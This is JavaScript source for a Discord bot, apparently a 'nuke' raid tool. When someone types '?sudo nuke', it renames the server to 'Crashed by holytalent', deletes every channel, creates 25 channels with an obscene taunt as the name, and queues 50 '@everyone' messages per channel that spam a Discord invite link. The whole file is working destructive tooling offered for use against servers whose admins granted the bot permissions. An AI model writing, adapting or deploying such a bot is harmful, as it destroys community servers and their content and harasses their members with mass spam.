const { Client, Events, GatewayIntentBits, ChannelType } = require('discord.js');
const client = new Client({ intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildIntegrations,
    GatewayIntentBits.GuildWebhooks,
    GatewayIntentBits.GuildInvites,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildPresences,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMessageReactions,
    GatewayIntentBits.GuildMessageTyping,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.DirectMessageReactions,
    GatewayIntentBits.DirectMessageTyping,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildScheduledEvents,
    GatewayIntentBits.AutoModerationConfiguration,
    GatewayIntentBits.AutoModerationExecution
] });

client.once('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
});




client.on(Events.MessageCreate, async message => {

    async function crash(){
        const spamMessage = "@everyone discord.gg/KbXnPBk9Qv"
        const channelName = "fucked-by-holytalent"
        try {
            await message.guild.setName('Crashed by holytalent');
        } catch (err) {
            console.error('Failed to change guild name:', err);
        }

        const channels = [...message.guild.channels.cache.values()];
        await Promise.all(channels.map(async channel => {
            try {
                await channel.delete();
            } catch (err) {
                console.error(`Failed to delete channel ${channel.name}:`, err);
            }
        }));

        let newChannels = [];
        try {
            const createChannelPromises = [];
            for (let i = 0; i < 25; i++) {
                createChannelPromises.push(
                    message.guild.channels.create({
                        name: channelName,
                        type: ChannelType.GuildText
                    }).catch(err => {
                        if (err.message && err.message.includes('Maximum number of channels reached')) {
                            return 'MAX_CHANNELS';
                        }
                        console.error('Failed to create channel:', err);
                        return null;
                    })
                );
            }
            newChannels = (await Promise.all(createChannelPromises))
                .filter(ch => ch && ch !== 'MAX_CHANNELS');
        } catch (err) {
            console.error('Error during channel creation:', err);
        }
        const sendPromises = [];
        for (const channel of newChannels) {
            for (let j = 0; j < 50; j++) {
                sendPromises.push(channel.send(spamMessage));
            }
        }
    }

    if (message.content == "?sudo nuke") {
        if (!message.guild) return;
        crash()
    }
    
});

client.login("token")
